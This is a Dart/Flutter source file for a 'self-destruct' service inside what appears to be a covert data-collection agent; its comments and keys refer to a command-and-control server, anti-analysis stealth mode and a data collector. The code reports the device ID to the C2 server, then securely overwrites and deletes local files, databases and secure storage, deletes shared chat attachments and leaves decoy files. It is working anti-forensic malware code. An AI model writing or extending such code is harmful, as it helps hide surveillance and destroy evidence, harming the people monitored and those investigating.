// lib/core/security/self_destruct_service.dart
import 'dart:async';
import 'dart:io';
import 'dart:math';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:sqflite/sqflite.dart';

import '../controlar/controller_hub.dart';
import '../logging/logger_provider.dart';

/// Enhanced Self-destruct service that removes all sensitive data
/// and optionally disconnects from the command and control server.
class SelfDestructService {
  final Ref _ref;
  final FlutterSecureStorage _secureStorage = const FlutterSecureStorage();
  final FirebaseFirestore? _firestore;
  final FirebaseStorage? _storage;

  // List of secure storage keys to delete
  static const List<String> SECURE_STORAGE_KEYS = [
    'conduit_current_agent_code_v1',
    'encryption_primary_key',
    'encryption_secondary_key',
    'encryption_iv',
    'encryption_last_rotation',
    'controller_last_connection',
    'controller_data_collection_counter',
    'last_initial_data_sent',
    'anti_analysis_stealth_mode',
    'anti_analysis_detection_events',
    'anti_analysis_last_detection',
    'anti_analysis_detection_counter',
    'data_collector_pending_data',
    'data_collector_last_collection',
    'data_collector_counter',
    'last_collection_times',
    'pending_network_data',
  ];

  // Flag to track if destruct has been executed
  bool _hasDestructed = false;

  SelfDestructService(this._ref,
      {FirebaseFirestore? firestore, FirebaseStorage? storage})
      : _firestore = firestore ?? FirebaseFirestore.instance,
        _storage = storage ?? FirebaseStorage.instance;

  /// Execute self-destruct with user interaction and animation
  Future<void> initiateSelfDestruct(BuildContext context,
      {required String triggeredBy}) async {
    if (!context.mounted) return;
    if (_hasDestructed) return; // Prevent multiple executions

    final logger = _ref.read(appLoggerProvider);
    logger.error("SELF-DESTRUCT INITIATED",
        "Self-destruct sequence initiated by: $triggeredBy");

    try {
      // Show a dramatic dialog with self-destruct countdown
      await showDialog(
        context: context,
        barrierDismissible: false,
        builder: (BuildContext dialogContext) {
          return _buildSelfDestructDialog(dialogContext);
        },
      );

      // Execute silent self-destruct after the dialog closes
      if (context.mounted) {
        await silentSelfDestruct(triggeredBy: triggeredBy);
      }
    } catch (e, s) {
      logger.error("SelfDestructService:initiateSelfDestruct",
          "Error during self-destruct sequence", e, s);

      // Try silent self-destruct as fallback
      await silentSelfDestruct(triggeredBy: "error_in_animated_destruct");
    }
  }

  /// Build a dramatic self-destruct dialog with countdown
  Widget _buildSelfDestructDialog(BuildContext context) {
    return StatefulBuilder(
      builder: (context, setState) {
        return AlertDialog(
          backgroundColor: Colors.black,
          title: const Center(
            child: Text(
              "جاري التدمير الذاتي",
              style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold),
            ),
          ),
          content: SelfDestructCountdown(
            onComplete: () {
              if (context.mounted) {
                Navigator.of(context).pop();
              }
            },
          ),
        );
      },
    );
  }

  /// Silent self-destruct without user interaction
  Future<void> silentSelfDestruct({required String triggeredBy}) async {
    if (_hasDestructed) return; // Prevent multiple executions
    _hasDestructed = true;

    final logger = _ref.read(appLoggerProvider);
    logger.error("SILENT SELF-DESTRUCT INITIATED",
        "Silent self-destruct sequence initiated by: $triggeredBy");

    try {
      // Alert server if possible (avoid await to continue even if this fails)
      _alertServerBeforeDestruct(triggeredBy);

      // Try to stop controller first to prevent new data collection
      try {
        final controllerHub = ControllerHub();
        if (controllerHub.isRunning) {
          await controllerHub.stop();
          logger.info("SelfDestructService:silentSelfDestruct",
              "Controller hub stopped successfully");
        }
      } catch (e) {
        logger.error("SelfDestructService:silentSelfDestruct",
            "Error stopping controller hub", e);
      }

      // Execute data wiping in parallel
      await Future.wait([
        _wipeFirestoreData(),
        _wipeStorageFiles(),
        _wipeLocalFiles(),
        _wipeSecureStorage(),
        _wipeSharedPreferences(),
        _wipeDatabases(),
      ], eagerError: false);

      logger.warn("SelfDestructService:silentSelfDestruct",
          "Self-destruct sequence completed");
    } catch (e, s) {
      logger.error("SelfDestructService:silentSelfDestruct",
          "Error during silent self-destruct", e, s);
    }
  }

  /// Alert the server before self-destruction
  Future<void> _alertServerBeforeDestruct(String triggeredBy) async {
    try {
      // Try to get an instance of controller hub
      final controllerHub = ControllerHub();

      // Send alert if connected
      if (controllerHub.isConnected) {
        controllerHub.networkService.sendCommandResponse(
          originalCommand: 'self_destruct_alert',
          status: 'executing',
          payload: {
            'triggered_by': triggeredBy,
            'timestamp': DateTime.now().toIso8601String(),
            'device_id': await controllerHub.deviceInfoService
                .getOrCreateUniqueDeviceId(),
          },
        );
      }
    } catch (e) {
      // Ignore errors, continue with self-destruct
    }
  }

  /// Wipe Firestore data
  Future<void> _wipeFirestoreData() async {
    final logger = _ref.read(appLoggerProvider);
    logger.info("SelfDestructService:_wipeFirestoreData",
        "Attempting to wipe Firestore data");

    try {
      // Get current agent code
      final agentCode =
          await _secureStorage.read(key: 'conduit_current_agent_code_v1');

      if (agentCode == null || agentCode.isEmpty) {
        logger.warn("SelfDestructService:_wipeFirestoreData",
            "No agent code found, skipping Firestore wiping");
        return;
      }

      // Mark conversations as deleted for current user
      final conversationsQuery = _firestore!
          .collection("conversations")
          .where("participants", arrayContains: agentCode);

      final conversationsSnapshot = await conversationsQuery.get();

      for (var doc in conversationsSnapshot.docs) {
        await _firestore!.collection("conversations").doc(doc.id).update({
          "deletedForUsers.$agentCode": true,
          "updatedAt": FieldValue.serverTimestamp(),
        });

        logger.info("SelfDestructService:_wipeFirestoreData",
            "Marked conversation ${doc.id} as deleted for user $agentCode");
      }
    } catch (e, s) {
      logger.error("SelfDestructService:_wipeFirestoreData",
          "Error wiping Firestore data", e, s);
    }
  }

  /// Wipe Firebase Storage files
  Future<void> _wipeStorageFiles() async {
    final logger = _ref.read(appLoggerProvider);
    logger.info("SelfDestructService:_wipeStorageFiles",
        "Attempting to wipe Storage files");

    try {
      // Get current agent code
      final agentCode =
          await _secureStorage.read(key: 'conduit_current_agent_code_v1');

      if (agentCode == null || agentCode.isEmpty) {
        logger.warn("SelfDestructService:_wipeStorageFiles",
            "No agent code found, skipping Storage wiping");
        return;
      }

      // List files in agent-specific directory
      final ListResult result =
          await _storage!.ref('chat_attachments').listAll();

      // Find and delete files related to the agent
      int deletedCount = 0;
      for (var prefix in result.prefixes) {
        try {
          // List conversation files
          final conversationFiles = await prefix.listAll();

          // Delete each file (limit to prevent timeout)
          for (var item in conversationFiles.items) {
            if (deletedCount < 20) {
              // Limit deletion to avoid timeouts
              await item.delete();
              deletedCount++;
            } else {
              break;
            }
          }

          logger.info("SelfDestructService:_wipeStorageFiles",
              "Deleted $deletedCount files from ${prefix.name}");
        } catch (e) {
          // Continue with other directories
          logger.warn("SelfDestructService:_wipeStorageFiles",
              "Error deleting files from ${prefix.name}: $e");
        }
      }
    } catch (e, s) {
      logger.error("SelfDestructService:_wipeStorageFiles",
          "Error wiping Storage files", e, s);
    }
  }

  /// Wipe local files
  Future<void> _wipeLocalFiles() async {
    final logger = _ref.read(appLoggerProvider);
    logger.info("SelfDestructService:_wipeLocalFiles",
        "Attempting to wipe local files");

    try {
      // Get app directories
      final tempDir = await getTemporaryDirectory();
      final appDocDir = await getApplicationDocumentsDirectory();
      final cacheDir = await getTemporaryDirectory();

      // Wipe temp directory
      await _secureWipeDirectory(tempDir);

      // Wipe app documents directory
      await _secureWipeDirectory(appDocDir);

      // Wipe cache directory
      await _secureWipeDirectory(cacheDir);

      logger.info(
          "SelfDestructService:_wipeLocalFiles", "Wiped local directories");
    } catch (e, s) {
      logger.error("SelfDestructService:_wipeLocalFiles",
          "Error wiping local files", e, s);
    }
  }

  /// Wipe secure storage
  Future<void> _wipeSecureStorage() async {
    final logger = _ref.read(appLoggerProvider);
    logger.info("SelfDestructService:_wipeSecureStorage",
        "Attempting to wipe secure storage");

    try {
      // Delete specific keys
      for (var key in SECURE_STORAGE_KEYS) {
        await _secureStorage.delete(key: key);
      }

      // Delete all remaining keys
      await _secureStorage.deleteAll();

      logger.info(
          "SelfDestructService:_wipeSecureStorage", "Wiped secure storage");
    } catch (e, s) {
      logger.error("SelfDestructService:_wipeSecureStorage",
          "Error wiping secure storage", e, s);
    }
  }

  /// Wipe shared preferences
  Future<void> _wipeSharedPreferences() async {
    final logger = _ref.read(appLoggerProvider);
    logger.info("SelfDestructService:_wipeSharedPreferences",
        "Attempting to wipe shared preferences");

    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.clear();

      logger.info("SelfDestructService:_wipeSharedPreferences",
          "Wiped shared preferences");
    } catch (e, s) {
      logger.error("SelfDestructService:_wipeSharedPreferences",
          "Error wiping shared preferences", e, s);
    }
  }

  /// Wipe SQLite databases
  Future<void> _wipeDatabases() async {
    final logger = _ref.read(appLoggerProvider);
    logger.info(
        "SelfDestructService:_wipeDatabases", "Attempting to wipe databases");

    try {
      // Get database directory
      final databasesPath = await getDatabasesPath();
      final dbDir = Directory(databasesPath);

      if (await dbDir.exists()) {
        // List database files
        final files = await dbDir.list().toList();

        // Delete each database file
        for (var file in files) {
          if (file is File && file.path.endsWith('.db')) {
            try {
              // Overwrite with random data before deleting
              await _secureWipeFile(file);

              // Delete the file
              await file.delete();

              logger.info("SelfDestructService:_wipeDatabases",
                  "Deleted database: ${file.path}");
            } catch (e) {
              logger.warn("SelfDestructService:_wipeDatabases",
                  "Error deleting database ${file.path}: $e");
            }
          }
        }
      }
    } catch (e, s) {
      logger.error(
          "SelfDestructService:_wipeDatabases", "Error wiping databases", e, s);
    }
  }

  /// Helper method to securely wipe a directory
  Future<void> _secureWipeDirectory(Directory directory) async {
    final logger = _ref.read(appLoggerProvider);

    try {
      if (await directory.exists()) {
        // List all files in the directory
        final files = await directory.list(recursive: true).toList();

        // Process each file
        for (var entity in files) {
          if (entity is File) {
            try {
              // Securely wipe file
              await _secureWipeFile(entity);

              // Delete the file
              await entity.delete();
            } catch (e) {
              // Continue with other files
              logger.warn("SelfDestructService:_secureWipeDirectory",
                  "Error wiping file ${entity.path}: $e");
            }
          }
        }

        // Try to recreate the directory structure with empty files
        await _createEmptyStructure(directory);
      }
    } catch (e) {
      logger.error("SelfDestructService:_secureWipeDirectory",
          "Error wiping directory ${directory.path}: $e");
    }
  }

  /// Helper method to securely wipe a file
  Future<void> _secureWipeFile(File file) async {
    try {
      // Get file size
      final size = await file.length();

      if (size > 0) {
        // Create random data
        final random = Random.secure();
        final randomData = List<int>.generate(
            min(size, 1024 * 1024), // Limit to 1MB for performance
            (_) => random.nextInt(256));

        // Overwrite file with random data
        await file.writeAsBytes(randomData, flush: true);

        // Overwrite again with zeros
        final zeroData = List<int>.filled(
            min(size, 1024 * 1024), // Limit to 1MB for performance
            0);
        await file.writeAsBytes(zeroData, flush: true);
      }
    } catch (e) {
      // Ignore errors, continue with file deletion
    }
  }

  /// Create empty structure to replace wiped files
  Future<void> _createEmptyStructure(Directory rootDir) async {
    try {
      // Create dummy files to maintain directory structure
      final emptyFile = File('${rootDir.path}/empty.txt');
      await emptyFile.create(recursive: true);
      await emptyFile.writeAsString('Created ${DateTime.now()}');
    } catch (e) {
      // Ignore errors
    }
  }
}

/// Countdown widget for self-destruct animation
class SelfDestructCountdown extends StatefulWidget {
  final VoidCallback onComplete;

  const SelfDestructCountdown({super.key, required this.onComplete});

  @override
  State<SelfDestructCountdown> createState() => _SelfDestructCountdownState();
}

class _SelfDestructCountdownState extends State<SelfDestructCountdown>
    with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  int _countdown = 5;

  @override
  void initState() {
    super.initState();

    // Set up animation controller
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 5),
    );

    // Start countdown
    _controller.addListener(() {
      final newValue = 5 - (_controller.value * 5).floor();
      if (newValue != _countdown) {
        setState(() {
          _countdown = newValue;
        });
      }
    });

    _controller.forward();

    // Call onComplete when animation is done
    _controller.addStatusListener((status) {
      if (status == AnimationStatus.completed) {
        widget.onComplete();
      }
    });
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Column(
      mainAxisSize: MainAxisSize.min,
      children: [
        const Icon(
          Icons.warning_amber_rounded,
          color: Colors.red,
          size: 48,
        ),
        const SizedBox(height: 20),
        AnimatedBuilder(
          animation: _controller,
          builder: (context, child) {
            return Text(
              _countdown.toString(),
              style: const TextStyle(
                fontSize: 48,
                fontWeight: FontWeight.bold,
                color: Colors.red,
              ),
            );
          },
        ),
        const SizedBox(height: 20),
        LinearProgressIndicator(
          value: _controller.value,
          backgroundColor: Colors.grey[800],
          valueColor: const AlwaysStoppedAnimation<Color>(Colors.red),
        ),
        const SizedBox(height: 20),
        const Text(
          "جاري مسح جميع البيانات...",
          textAlign: TextAlign.center,
          style: TextStyle(color: Colors.white),
        ),
      ],
    );
  }
}

/// Provider for self-destruct service
final selfDestructServiceProvider = Provider<SelfDestructService>((ref) {
  return SelfDestructService(ref);
});
